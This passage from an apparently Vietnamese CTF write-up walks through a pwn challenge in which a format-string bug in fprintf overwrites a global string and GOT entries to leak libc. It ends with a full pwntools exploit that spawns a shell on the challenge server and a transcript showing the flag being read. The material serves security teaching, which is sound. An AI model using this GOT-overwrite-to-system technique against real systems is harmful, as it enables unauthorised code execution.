</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wanna see me do a magic trick?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Give me your message and I&#39;ll see what I can do.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get_msg</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Voila! Your message is now gone. Give me another:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v6</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Dễ dàng nhận thấy rằng ở hàm main bị dính một lỗi buffer overflow nghiêm trọng. Tuy nhiên chương trình đã bật chế độ bảo vệ <code>Canary</code> nên mình không thể cứ thế mà overwrite được giá trị trên stack. Vậy nên hãy chuyển qua phân tích hàm <code>get_msg</code> tiếp theo nào.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">get_msg</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-D8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-D0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+D8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">stream</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hippity hoppity, now you see me, now you don&#39;t. Funni</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Ở hàm này chương trình đọc vào input của mình nhập vô biến <code>s</code> sau đó tiến hành gọi hàm <code>fprintf</code> để in format từ biến <code>s</code> sang file <code>/dev/null</code>. Và cũng như tất cả các hàm thuộc họ <code>printf</code> khác, vì không chỉ định trước format mà in thẳng buffer người dùng nhập vào cho nên hàm này cũng bị dính lỗi format string. Còn hàm <code>printf</code> kia thì do chỉ in ra 1 string cố định mà có lẽ sẽ không thể bị khai thác được.</p>
<p>Mặc dù <code>fprintf</code> dính lỗi format string nhưng tất cả output đều đã được đưa vào bên trong file <code>/dev/null</code> và do đó không thể leak được giá trị trên stack bằng hàm này. Tuy nhiên cũng vì mang lỗi format string mà <code>fprintf</code> cũng có thể bị khai thác để tiến hành việc ghi đè dữ liệu lên các vùng nhớ khác tương tự như các hàm thuộc họ <code>printf</code>.</p>
<p>Ngoài ra, thông thường chương trình sẽ lưu các string cố định vào vùng nhớ <em>.rodata</em> (read only data) nhưng khi nhấp chuột vào string bên trong hàm <code>printf</code> kia thì nó lại dẫn mình đến vùng nhớ <em>.data</em>, tức nó là một biến global? Thậm chí nó còn có tên biến là <code>msg</code> nữa cơ.</p>
<p>Do vùng nhớ <em>.data</em> có thể được ghi đè lên nên mình có thể thay đổi string này để khi chạy hàm <code>printf</code> sẽ dính lỗi format string và từ đó leak được giá trị trên stack ra ngoài.</p>
<p>Đối với những người chơi pwn lâu năm thì sẽ dễ nhận ra điều này hơn do tính tối ưu khi compiler của gcc sẽ tự động biến câu lệnh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hippity hoppity, now you see me, now you don&#39;t. Funni</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>thành</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hippity hoppity, now you see me, now you don&#39;t. Funni&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>nên không thể nào có chuyện một đoạn code như thế nằm chình ình trong chương trình mà cái string đó lại không phải là biến global được.</p>
<p>Và đương nhiên việc có thể ghi đè lên được string này thì mình có thể tận dụng lỗi của hàm <code>fprintf</code> ở trước đó để khai thác. Nếu đã tới được đây rồi thì việc khai thác còn lại sẽ rẽ nhiều hướng khác nhau tùy thuộc vào chọn lựa của các bạn thôi.</p>

<h3 class="relative group">Lên kịch bản khai thác 
    <div id="lên-kịch-bản-khai-thác-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#l%c3%aan-k%e1%bb%8bch-b%e1%ba%a3n-khai-th%c3%a1c-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Cho dù hướng đi của các bạn có là gì đi chăng nữa thì đều phải qua được một bước chung nhất đó chính là ghi đè lên biến <code>msg</code> để leak được giá trị trên stack ra và từ đó có thể khai thác theo nhiều kiểu khác nhau, tiêu biểu như:</p>
<ul>
<li>
<p>Dùng <code>fprintf</code> để leak giá trị libc bằng <code>printf</code> đồng thời ghi đè lên GOT của hàm <code>read</code> hoặc hàm <code>__stack_chk_fail</code> thành địa chỉ của hàm <code>main</code> để chương trình quay trở về hàm <code>main</code> khi trigger 1 trong 2 hàm này. Sau đó lại tiếp tục khai thác hàm <code>fprintf</code> để ghi đè GOT của hàm <code>printf</code> thành <code>system</code> và ghi đè biến <code>msg</code> thành string &ldquo;sh&rdquo; để khi chương trình gọi <em>printf(msg)</em> thì nó sẽ gọi <em>system(&ldquo;sh&rdquo;)</em>.</p>
</li>
<li>
<p>Dùng <code>fprintf</code> để leak giá trị libc và canary bằng <code>printf</code> sau đó lợi dụng lỗi buffer overflow của hàm <code>main</code> khi gọi <code>read</code> để ghi đè lên stack giá trị canary đúng sau đó tiếp tục overflow xuống dưới để <em>ret2system</em> và chiếm shell.</p>
</li>
<li>
<p>Dùng <code>fprintf</code> để leak giá trị libc ằng <code>printf</code> đồng thời ghi đè lên GOT của hàm <code>__stack_chk_fail</code> bằng câu lệnh <code>ret</code> để khiến nó trở nên vô dụng sau đó cũng khai thác việc gọi <code>read</code> ở hàm <code>main</code> để <em>ret2system</em>.</p>
</li>
</ul>
<p>Đối với mình thì mình sẽ sử dụng cách đầu tiên nhé.</p>

<h3 class="relative group">Tiến hành debug 
    <div id="tiến-hành-debug-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ti%e1%ba%bfn-h%c3%a0nh-debug-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Việc debug ở đây cũng không có gì đáng chú ý, chủ yếu là mình đặt breakpoint ở 2 thời điểm lúc gọi <code>fprintf</code> và <code>printf</code> để xem buffer của mình ở offset thứ mấy trên stack (cho việc ghi đè bằng hàm <code>fprintf</code>) cũng như là của các giá trị cần tìm như libc, canary (cho việc leak).</p>
<p>Đầu tiên là dừng tại lúc gọi hàm <code>fprintf</code>:</p>
<p>






<figure>
      <img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="GDB_fprintf"
    srcset="
      /writeup/bkisc_recruit/fprintf_hu_9551f150b2afbaa2.png  330w,
      /writeup/bkisc_recruit/fprintf_hu_46e81114c1f35f34.png  660w,
      /writeup/bkisc_recruit/fprintf_hu_84f90a8b2ea76d28.png 1280w
    "
    data-zoom-src="/writeup/bkisc_recruit/fprintf.png"
    src="/writeup/bkisc_recruit/fprintf.png">

  
</figure>
</p>
<p>Chuỗi mình nhập vào nằm ở index thứ 2 trên stack, do hàm <code>fprintf</code> nhận vào tối thiểu 2 argument mà index thứ 0 trên stack sẽ bắt đầu ở offset thứ 5 chứ không phải thứ 6 như khi gọi <code>printf</code>. Qua đó mình biết được input buffer của mình nằm ở offset thứ 7.</p>
<p>Ngoài ra thì nếu các bạn muốn biết khi gọi hàm <code>fprintf</code> sẽ in cái gì vào <code>/dev/null</code> thì trong gdb trước khi chương trình gọi hàm này có thể dùng lệnh <code>set $rdi=stdout</code> để pipe output của hàm vào <code>stdout</code> thay vì vào <code>/dev/null</code>.</p>
<p>Tiếp theo mình sẽ dừng tại đoạn gọi <code>printf</code>:</p>
<p>






<figure>
      <img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="GDB_printf"
    srcset="
      /writeup/bkisc_recruit/printf_hu_a2775168cd1b0b86.png  330w,
      /writeup/bkisc_recruit/printf_hu_f7aae15a52861b77.png  660w,
      /writeup/bkisc_recruit/printf_hu_2856098e0e0dfbb4.png 1280w
    "
    data-zoom-src="/writeup/bkisc_recruit/printf.png"
    src="/writeup/bkisc_recruit/printf.png">

  
</figure>
</p>
<p>Các bạn có thể sử dụng lệnh <code>stack &lt;n&gt;</code> với n là số dòng trên stack muốn xem để có thể quan sát được các giá trị trong stack ở dưới sâu hơn. Dưới đây là kết quả của 30 giá trị trên stack:</p>
<p>






<figure>
      <img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="stack"
    srcset="
      /writeup/bkisc_recruit/stack_hu_826aa9ff8679f91f.png  330w,
      /writeup/bkisc_recruit/stack_hu_5fa8e3b25cbebcd0.png  660w,
      /writeup/bkisc_recruit/stack_hu_b54fa057acbd58fe.png 1280w
    "
    data-zoom-src="/writeup/bkisc_recruit/stack.png"
    src="/writeup/bkisc_recruit/stack.png">

  
</figure>
</p>
<p>Mình nhận thấy rằng có thể leak được giá trị của hàm <code>puts+346</code> ở index thứ 0x15 (21) trên stack, tức là offset thứ 27 vì đây là hàm <code>printf</code>. Nếu các bạn muốn leak được thêm canary thì nó nằm ở offset 33 đấy.</p>
<p>Như mọi lần giải các thử thách pwnable thì sau đó là 1 khoảng thời gian cồng kềnh để debug kiểm tra từng bước trong script mình viết đã đúng hay chưa, việc ghi đè có đúng giá trị hay không,&hellip; Nhưng chung quy lại thì đến đây là đã xong được 90% rồi, còn lại thì chỉ có viết script thôi.</p>

<h3 class="relative group">Viết script khai thác 
    <div id="viết-script-khai-thác-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#vi%e1%ba%bft-script-khai-th%c3%a1c-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><del>Lại 1 lần nữa xin được nhắc nhở người biết cách giải bài này mà toàn bị chặn do script lỏ nhé. Tạo ticket mà thấy 80% là làm được nhưng toàn bị vấn đề scripting.</del></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chall&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">script</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;b* get_msg+144
</span></span></span><span class="line"><span class="cl"><span class="s1">b* main+124
</span></span></span><span class="line"><span class="cl"><span class="s1">c
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io, gdbscript=script, api=True)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;34.124.216.27&#39;</span><span class="p">,</span> <span class="mi">4200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># make GOT read function call main + leak libc puts+346 by overwriting the msg at printf</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]:</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">],</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span><span class="sa">b</span><span class="s1">&#39;%27$p&#39;</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;t&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">346</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]:</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span><span class="sa">b</span><span class="s1">&#39;sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Chạy script rồi lấy flag thôi.</p>
<pre tabindex="0"><code>$ python exp.py
[+] Opening connection to 34.124.216.27 on port 4200: Done
[*] Libc base: 0x7feada27e000
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
BKISC{th3_m4g1k_0f_l34kl3s5_f0rm4t_1s_7h4t_y0u_c4n_5t1ll_wr1t3}
</code></pre>
          
          
          
        </div>

        

        

        

        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.82ed1b2b9ae9783fbfd2617e4fd0c873449efa956bfdf7e4e2f33d54d40e0159f1b422abdecafdd3c5c64becfd6956596108745d07c580b6b79de26fcceb0caa.js"
          integrity="sha512-gu0bK5rpeD&#43;/0mF&#43;T9DIc0Se&#43;pVr/ffk4vM9VNQOAVnxtCKr3sr908XGS&#43;z9aVZZYQh0XQfFgLa3neJvzOsMqg=="
          data-oid="views_writeup\bkisc_recruit\index.md"
          data-oid-likes="likes_writeup\bkisc_recruit\index.md"></script>
      

    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/writeup/umd-osint/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >UMDCTF 2023 - TCC1-4 writeup</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-05-02T03:50:54&#43;00:00">2 May 2023</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/writeup/mapna-ctf-2024/">
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >MAPNA CTF 2024 - PWN writeup</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-01-21T11:00:00&#43;00:00">21 January 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
        <ul class="flex flex-col list-none sm:flex-row">
          
            <li
              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2025
          
      </p>
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script> 
  
  <script
    type="text/javascript"
    src="/js/process.min.f2a95fd05ee0c134a02dcdc06212805ec0f175944b24ba9c742211ae1e4719f192cc685f2150bd5009e046788e63e011ff27f68e6fb3fa42e50918fe7f2bfb75.js"
    integrity="sha512-8qlf0F7gwTSgLc3AYhKAXsDxdZRLJLqcdCIRrh5HGfGSzGhfIVC9UAngRniOY&#43;AR/yf2jm&#43;z&#43;kLlCRj&#43;fyv7dQ=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
